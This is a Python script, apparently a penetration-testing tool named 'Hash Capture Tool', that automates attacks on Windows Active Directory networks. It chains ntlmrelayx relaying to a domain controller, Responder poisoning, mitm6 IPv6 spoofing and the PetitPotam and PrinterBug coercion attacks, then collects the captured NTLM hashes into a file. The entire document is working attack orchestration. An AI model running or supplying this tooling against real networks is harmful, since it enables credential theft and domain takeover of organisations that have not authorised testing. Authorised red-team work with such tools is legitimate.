#!/usr/bin/env python3

import os
import sys
import time
import signal
import logging
import argparse
import netifaces
import ipaddress
import subprocess
import shutil
import socket
from pathlib import Path
from subprocess import Popen, PIPE, STDOUT
from threading import Thread, Event
import json
import re
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('hash_capture.log')
    ]
)

class HashCapture:
    def __init__(self, interface, duration=600, domain=None, creds=None, verbose=True):
        self.interface = interface
        self.duration = duration
        self.domain = domain
        self.creds = creds
        self.verbose = verbose
        self.stop_event = Event()
        self.processes = {}
        self.attack_threads = []
        self.local_ip = self.get_local_ip()
        self.original_ipv6_forward = None
        self.dc_ip = None

        # Initialize logger
        self.logger = logging.getLogger(__name__)
        
        # Set up attack loggers
        self.attack_loggers = {
            "ntlmrelay": logging.getLogger("ntlmrelay"),
            "responder": logging.getLogger("responder"),
            "mitm6": logging.getLogger("mitm6"),
            "petitpotam": logging.getLogger("petitpotam"),
            "printerbug": logging.getLogger("printerbug")
        }

        # Configure attack loggers
        for name, logger in self.attack_loggers.items():
            logger.setLevel(logging.DEBUG if verbose else logging.INFO)
            # Add console handler
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logger.addHandler(console_handler)
            # Add file handler
            file_handler = logging.FileHandler(f'{name}_attack.log')
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            logger.addHandler(file_handler)

        # Configure signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def create_targets_file(self):
        """Create targets file for ntlmrelayx"""
        try:
            if not self.domain:
                self.logger.warning("No domain specified for targets file")
                return True

            self.dc_ip = self.get_dc_ip()
            if not self.dc_ip:
                self.logger.error(f"Could not resolve domain controller for {self.domain}")
                return False

            with open("targets.txt", "w") as f:
                f.write(f"ldaps://{self.dc_ip}\n")
                f.write(f"ldap://{self.dc_ip}\n")
                f.write(f"smb://{self.dc_ip}\n")
            
            self.logger.info("Created targets file successfully")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create targets file: {e}")
            return False

    def setup_ipv6_forwarding(self):
        """Setup IPv6 forwarding"""
        try:
            # Read original value
            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'r') as f:
                self.original_ipv6_forward = f.read().strip()
            
            # Enable forwarding
            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
                f.write('1')
            
            self.logger.info("IPv6 forwarding enabled")
            return True
        except Exception as e:
            self.logger.error(f"Failed to enable IPv6 forwarding: {e}")
            return False

    def restore_ipv6_forwarding(self):
        """Restore original IPv6 forwarding state"""
        if self.original_ipv6_forward is not None:
            try:
                with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
                    f.write(self.original_ipv6_forward)
                self.logger.info("IPv6 forwarding restored")
            except Exception as e:
                self.logger.error(f"Failed to restore IPv6 forwarding: {e}")

    def get_local_ip(self):
        """Get IP address for specified interface"""
        try:
            return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            self.logger.error(f"Failed to get IP for interface {self.interface}: {e}")
            return None

    def get_dc_ip(self):
        """Get domain controller IP address"""
        try:
            if self.domain:
                cmd = f"nslookup -type=SRV _ldap._tcp.dc._msdcs.{self.domain}"
                output = subprocess.check_output(cmd.split(), universal_newlines=True)
                dc_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', output)
                if dc_ips:
                    return dc_ips[0]
        except Exception as e:
            self.logger.error(f"Failed to get DC IP: {e}")
        return None

    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        self.logger.info("Shutting down...")
        self.stop_event.set()
        self.cleanup()

    def process_output(self, process, logger, name):
        """Helper function to process output from attack processes"""
        try:
            while True:
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break
                    continue
                line_str = line.strip()
                if line_str:
                    logger.info(f"{line_str}")
        except Exception as e:
            self.logger.error(f"Error processing output for {name}: {e}")

    def cleanup(self):
        """Clean up running processes and restore system state"""
        self.logger.info("Cleaning up processes")
        for name, process in self.processes.items():
            try:
                self.logger.info(f"Terminating {name}")
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.logger.warning(f"Force killing {name}")
                    process.kill()
                    process.wait()
            except Exception as e:
                self.logger.error(f"Error cleaning up {name}: {e}")

        # Restore IPv6 forwarding
        self.restore_ipv6_forwarding()

    def start_ntlmrelay(self):
        """Start NTLM relay attack"""
        try:
            cmd = [
                "ntlmrelayx.py",
                "-tf", "targets.txt",
                "-smb2support",
                "-debug"
            ]
            
            if self.domain:
                cmd.extend([
                    "--no-http-server",
                    "--no-wcf",
                    "--no-raw",
                    "-wh", self.local_ip
                ])
            
            self.logger.info(f"Starting NTLM relay with command: {' '.join(cmd)}")
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            self.processes["ntlmrelay"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["ntlmrelay"], "NTLM Relay")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_ntlmrelay: {e}")
            return False

    def start_responder(self):
        """Start Responder attack"""
        try:
            cmd = [
                "responder",
                "-I", self.interface,
                "-wd"
            ]

            self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            self.processes["responder"] = process

            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["responder"], "Responder")
            )
            output_thread.daemon = True
            output_thread.start()

            return True
        except Exception as e:
            self.logger.error(f"Error in start_responder: {e}")
            return False

    def start_mitm6(self):
        """Start mitm6 attack"""
        try:
            # Install required dependencies
            try:
                subprocess.check_call([
                    "pip", "install",
                    "--no-deps", "mitm6==0.2.2",
                    "--break-system-packages"
                ])
            except:
                self.logger.warning("Could not downgrade mitm6")

            cmd = [
                "mitm6",
                "-i", self.interface,
                "--debug"
            ]
            
            if self.domain:
                cmd.extend(["-d", self.domain])
            
            self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
            env = os.environ.copy()
            env["PYTHONIOENCODING"] = "latin1"
            env["PYTHONUNBUFFERED"] = "1"
            
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1,
                env=env
            )
            self.processes["mitm6"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["mitm6"], "MITM6")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_mitm6: {e}")
            return False

    def start_petitpotam(self):
        """Start PetitPotam attack"""
        try:
            if not self.domain or not self.dc_ip:
                self.logger.warning("PetitPotam attack requires a valid domain")
                return False

            cmd = [
                "petitpotam.py",
                self.local_ip,
                self.dc_ip,
                "-pipe", "lsarpc"
            ]
            
            if self.creds:
                cmd.extend(["-u", self.creds])
            else:
                cmd.append("-no-pass")
            
            self.logger.info(f"Starting PetitPotam with command: {' '.join(cmd)}")
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            self.processes["petitpotam"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["petitpotam"], "PetitPotam")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_petitpotam: {e}")
            return False

    def start_printerbug(self):
        """Start PrinterBug attack"""
        try:
            if not self.domain or not self.dc_ip:
                self.logger.warning("PrinterBug attack requires a valid domain")
                return False

            if self.creds:
                username, password = self.creds.split(':')
                cmd = [
                    "printerbug.py",
                    f"{self.domain}/{username}:{password}@{self.dc_ip}",
                    self.local_ip
                ]
            else:
                cmd = [
                    "printerbug.py",
                    f"{self.domain}/anonymous@{self.dc_ip}",
                    self.local_ip,
                    "-no-pass"
                ]
            
            self.logger.info(f"Starting PrinterBug with command: {' '.join(cmd)}")
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            self.processes["printerbug"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["printerbug"], "PrinterBug")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_printerbug: {e}")
            return False

    def extract_hashes(self):
        """Extract captured hashes and passwords from Responder and MITM6 logs"""
        hashes = []

        # Extract from Responder log if it exists
        if os.path.isfile("Responder-Session.log"):
            with open("Responder-Session.log", "r") as f:
                for line in f:
                    if "NTLMv1" in line or "NTLMv2" in line:
                        hashes.append(line.strip())
        else:
            self.logger.warning("Responder-Session.log not found, skipping hash extraction for Responder")

        # Extract from MITM6 log if it exists
        if os.path.isfile("mitm6.log"):
            with open("mitm6.log", "r") as f:
                for line in f:
                    if "NTLMv1" in line or "NTLMv2" in line:
                        hashes.append(line.strip())
        else:
            self.logger.warning("mitm6.log not found, skipping hash extraction for MITM6")

        if hashes:
            with open("captured_hashes.txt", "w") as f:
                f.write("\n".join(hashes))

            self.logger.info(f"Extracted {len(hashes)} hashes/passwords to captured_hashes.txt")
        else:
            self.logger.warning("No hashes captured during the attack")

    def run(self):
        """Main execution flow running all attacks"""
        self.logger.info("Starting Hash Capture Operation")
        
        # Create targets file if domain is specified
        if not self.create_targets_file():
            self.logger.error("Failed to create targets file")
            return False

        # Setup IPv6 forwarding
        if not self.setup_ipv6_forwarding():
            self.logger.error("Failed to setup IPv6 forwarding")
            return False

        try:
            # List of attacks to run
            attacks = [
                ("NTLM Relay", self.start_ntlmrelay),
                ("PetitPotam", self.start_petitpotam),
                ("PrinterBug", self.start_printerbug)
            ]

            # Start each attack in its own thread
            for attack_name, attack_func in attacks:
                try:
                    self.logger.info(f"Launching {attack_name} attack...")
                    thread = Thread(target=attack_func)
                    thread.daemon = True
                    thread.start()
                    self.attack_threads.append(thread)
                    time.sleep(1)  # Small delay between starting attacks
                    self.logger.info(f"{attack_name} attack thread started successfully")
                except Exception as e:
                    self.logger.error(f"Failed to start {attack_name} attack: {e}")
            
            # Run Responder for the specified duration
            self.logger.info(f"Starting Responder for {self.duration} seconds...")
            responder_thread = Thread(target=self.start_responder)
            responder_thread.daemon = True
            responder_thread.start()
            time.sleep(self.duration)
            self.stop_event.set()
            responder_thread.join()
            self.stop_event.clear()

            # Wait for 10 seconds before starting MITM6
            self.logger.info("Waiting 60 seconds before starting MITM6...")
            time.sleep(60)

            # Run MITM6 for the specified duration
            self.logger.info(f"Starting MITM6 for {self.duration} seconds...")
            mitm6_thread = Thread(target=self.start_mitm6)
            mitm6_thread.daemon = True
            mitm6_thread.start()
            time.sleep(self.duration)
            self.stop_event.set()
            mitm6_thread.join()
            self.stop_event.clear()

            self.logger.info("All attacks completed.")

            # Extract captured hashes and passwords
            self.extract_hashes()

        except KeyboardInterrupt:
            self.logger.info("Operation interrupted by user")
        except Exception as e:
            self.logger.error(f"Error in main execution: {e}")
        finally:
            self.cleanup()
        
        return True

#part 2
def main():
    parser = argparse.ArgumentParser(description="Hash Capture Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-t", "--time", type=int, default=600, help="Duration in seconds to run Responder and MITM6 (default: 600)")
    parser.add_argument("-d", "--domain", help="Domain name for attacks")
    parser.add_argument("-c", "--creds", help="Domain credentials in the format 'user:password'")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    if os.geteuid() != 0:
        logging.error("This script must be run as root")
        sys.exit(1)

    capture = HashCapture(args.interface, args.time, args.domain, args.creds, args.verbose)
    if not capture.run():
        sys.exit(1)

if __name__ == "__main__":
    main()
